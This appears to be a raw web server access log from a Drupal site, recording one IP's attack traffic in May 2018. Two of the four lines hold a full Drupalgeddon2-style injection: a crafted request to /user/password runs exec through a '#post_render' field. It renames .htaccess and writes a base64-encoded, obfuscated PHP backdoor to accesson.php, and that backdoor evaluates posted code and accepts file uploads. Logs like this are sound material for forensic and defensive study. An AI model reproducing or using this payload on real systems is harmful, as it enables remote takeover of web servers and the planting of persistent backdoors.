91.105.64.146 - - [06/May/2018:19:52:47 -0400] "GET / HTTP/1.1" 200 3561 "https://www.nspw.org/file/ajax/name/%23value/form-yjjuQEjTgb1J9Bwu07R9Y1SyoIbtbT58U9rYmhztkfg" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0"
91.105.64.146 - - [06/May/2018:19:52:48 -0400] "POST /user/password?name[%23post_render][0]=exec&name%5B%23markup%5D=mv+-f+sites%2Fdefault%2Ffiles%2F.htaccess+sites%2Fdefault%2Ffiles%2F.hatccess%3Becho+PD9waHAgZWNobyA3NDU3NzM3KzczNjcyMzskcmFQb19yWmx1b0U9YmFzZTY0X2RlY29kZSgiWSIuY2hyKDEwOSkuIkYiLmNocigxMjIpLmNocig5MCkuIlQiLmNocig4OSkuY2hyKDQ4KS5jaHIoODgpLiIyIi4iUiIuImwiLiJZIi5jaHIoNTApLiI5Ii5jaHIoMTA3KS4iWiIuY2hyKDgxKS4iPSIuIj0iKTskeWRTSlB0bndyU3Y9YmFzZTY0X2RlY29kZShjaHIoODkpLiIyIi5jaHIoNTcpLmNocigxMTkpLmNocigxMDEpLmNocig4MSkuY2hyKDYxKS4iPSIpO2V2YWwoJHJhUG9fclpsdW9FKCRfUE9TVFtiYXNlNjRfZGVjb2RlKGNocig5NykuY2hyKDg3KS4iUSIuY2hyKDYxKSldKSk7aWYoJF9QT1NUW2Jhc2U2NF9kZWNvZGUoImQiLmNocig4OCkuY2hyKDY1KS4iPSIpXSA9PSBiYXNlNjRfZGVjb2RlKCJkIi4iWCIuY2hyKDY1KS5jaHIoNjEpKSl7QCR5ZFNKUHRud3JTdigkX0ZJTEVTW2Jhc2U2NF9kZWNvZGUoY2hyKDkwKS4ibSIuImwiLiJzIi5jaHIoOTApLiJRIi4iPSIuY2hyKDYxKSldW2Jhc2U2NF9kZWNvZGUoY2hyKDEwMCkuY2hyKDcxKS5jaHIoNDkpLiJ3Ii4iWCIuY2hyKDUwKS4iNSIuY2hyKDEwNCkuImIiLmNocig4NykuIlUiLmNocig2MSkpXSwkX0ZJTEVTW2Jhc2U2NF9kZWNvZGUoIloiLmNocigxMDkpLiJsIi4icyIuY2hyKDkwKS4iUSIuY2hyKDYxKS5jaHIoNjEpKV1bYmFzZTY0X2RlY29kZShjaHIoOTgpLiJtIi4iRiIuY2hyKDExNikuIloiLmNocig4MSkuY2hyKDYxKS4iPSIpXSk7fTsgPz4%3D%7Cbase64+--decode%7Ctee+sites%2Fdefault%2Ffiles%2Faccesson.php HTTP/1.1" 200 3402 "https://www.nspw.org/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0"
91.105.64.146 - - [06/May/2018:19:52:49 -0400] "POST /file/ajax/name/%23value/form-Zmyh6UF8EkLym5AeXiGsGCKCg3rjFKToyqny7EyBMlE HTTP/1.1" 200 1977 "https://www.nspw.org/user/password?name[%23post_render][0]=exec&name%5B%23markup%5D=mv+-f+sites%2Fdefault%2Ffiles%2F.htaccess+sites%2Fdefault%2Ffiles%2F.hatccess%3Becho+PD9waHAgZWNobyA3NDU3NzM3KzczNjcyMzskcmFQb19yWmx1b0U9YmFzZTY0X2RlY29kZSgiWSIuY2hyKDEwOSkuIkYiLmNocigxMjIpLmNocig5MCkuIlQiLmNocig4OSkuY2hyKDQ4KS5jaHIoODgpLiIyIi4iUiIuImwiLiJZIi5jaHIoNTApLiI5Ii5jaHIoMTA3KS4iWiIuY2hyKDgxKS4iPSIuIj0iKTskeWRTSlB0bndyU3Y9YmFzZTY0X2RlY29kZShjaHIoODkpLiIyIi5jaHIoNTcpLmNocigxMTkpLmNocigxMDEpLmNocig4MSkuY2hyKDYxKS4iPSIpO2V2YWwoJHJhUG9fclpsdW9FKCRfUE9TVFtiYXNlNjRfZGVjb2RlKGNocig5NykuY2hyKDg3KS4iUSIuY2hyKDYxKSldKSk7aWYoJF9QT1NUW2Jhc2U2NF9kZWNvZGUoImQiLmNocig4OCkuY2hyKDY1KS4iPSIpXSA9PSBiYXNlNjRfZGVjb2RlKCJkIi4iWCIuY2hyKDY1KS5jaHIoNjEpKSl7QCR5ZFNKUHRud3JTdigkX0ZJTEVTW2Jhc2U2NF9kZWNvZGUoY2hyKDkwKS4ibSIuImwiLiJzIi5jaHIoOTApLiJRIi4iPSIuY2hyKDYxKSldW2Jhc2U2NF9kZWNvZGUoY2hyKDEwMCkuY2hyKDcxKS5jaHIoNDkpLiJ3Ii4iWCIuY2hyKDUwKS4iNSIuY2hyKDEwNCkuImIiLmNocig4NykuIlUiLmNocig2MSkpXSwkX0ZJTEVTW2Jhc2U2NF9kZWNvZGUoIloiLmNocigxMDkpLiJsIi4icyIuY2hyKDkwKS4iUSIuY2hyKDYxKS5jaHIoNjEpKV1bYmFzZTY0X2RlY29kZShjaHIoOTgpLiJtIi4iRiIuY2hyKDExNikuIloiLmNocig4MSkuY2hyKDYxKS4iPSIpXSk7fTsgPz4%3D%7Cbase64+--decode%7Ctee+sites%2Fdefault%2Ffiles%2Faccesson.php" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0"
91.105.64.146 - - [06/May/2018:19:52:51 -0400] "GET / HTTP/1.1" 200 3426 "https://www.nspw.org/file/ajax/name/%23value/form-Zmyh6UF8EkLym5AeXiGsGCKCg3rjFKToyqny7EyBMlE" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0"
